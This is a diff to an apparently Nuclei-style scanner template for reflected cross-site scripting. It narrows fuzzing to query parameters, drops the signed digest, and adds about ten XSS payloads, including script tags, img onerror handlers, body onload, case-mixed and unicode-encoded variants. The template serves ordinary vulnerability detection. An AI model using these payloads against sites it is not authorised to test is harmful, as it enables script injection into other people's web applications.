@@ -1,49 +1,40 @@
 id: reflected-xss
 
 info:
-  name: Reflected Cross-Site Scripting
-  author: pdteam,0xKayala,AmirHossein Raeisi
+  name: Reflected Cross Site Scripting
+  author: pdteam
   severity: medium
-  metadata:
-    max-request: 1
-  tags: xss,rxss,dast,vuln
+  tags: xss,rxss,dast
 
 variables:
   first: "{{rand_int(10000, 99999)}}"
 
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "POST"'
-          - 'method == "GET"'
-        condition: or
+  - method: GET
+    path:
+      - "{{BaseURL}}"
 
     payloads:
       reflection:
-        - "'\"><{{first}}>"
+        - "'\"><{{first}}"
+        - "<img src=x onerror=alert({{first}})>"
+        - "<script>alert({{first}})</script>"
+        - "'><ScRiPt>alert({{first}})</sCrIpT>"
+        - "</script><ScRiPt>alert({{first}})</sCrIpT>"
+        - "</script><script>alert({{first}})</script>"
+        - "<body onload=alert({{first}})>"
+        - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
+        - "'><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
+        - "\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e"
 
     fuzzing:
-      - part: body
-        type: postfix
-        mode: single
-        fuzz:
-          - "{{url_encode(reflection)}}"
-
       - part: query
         type: postfix
         mode: single
         fuzz:
-          - "{{url_encode(reflection)}}"
-
-      - part: path
-        type: postfix
-        mode: single
-        fuzz:
-          - "{{url_encode(reflection)}}"
+          - "{{reflection}}"
 
     stop-at-first-match: true
-
     matchers-condition: and
     matchers:
       - type: word
@@ -52,7 +43,6 @@ http:
           - "{{reflection}}"
 
       - type: word
-        part: content_type
+        part: header
         words:
           - "text/html"
-# digest: 4a0a0047304502201f71f4b45c2da5dee0ab62eb4154bc61e208d3d7c0809dd5a80d040b0f10392c022100b9431765649131e7908db1de1bf6012edf733a1422e0508b822cdc47244e6e76:922c64590222798bb761d5b6d8e72950
